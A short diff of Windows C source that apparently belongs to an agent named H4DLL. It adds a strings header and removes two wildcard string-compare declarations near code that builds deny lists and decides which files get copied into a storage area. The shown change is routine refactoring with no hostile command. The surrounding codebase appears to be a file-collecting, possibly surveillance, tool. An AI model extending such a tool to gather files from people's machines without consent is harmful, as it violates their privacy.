@@ -3,6 +3,7 @@
 #include <Windows.h>
 #include <cJSON/cJSON.h>
 #include <time.h>
+#include <rcs/strings.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/H4-DLL.h"
 #include "../../H4DLL/bss.h"
@@ -311,15 +312,6 @@ static void PopulatePatternList(cJSON *conf_list)
 	for (i=0; i<pattern_list.deny_count; i++) 
 		pattern_list.deny_list[i] = cJSON_GetWideStringValue(cJSON_GetArrayItem(deny, i));
 }
-
-// Compara due stringhe con wildcard
-// torna 0 se le stringhe sono diverse
-int CmpWild(const unsigned char* wild, const unsigned char* string);
-
-// Compara due stringhe con wildcard
-// torna 0 se le stringhe sono diverse
-int CmpWildW(WCHAR* wild, WCHAR* string);
-
 
 // Verifica le condizioni per la copia del file
 // nello storage.
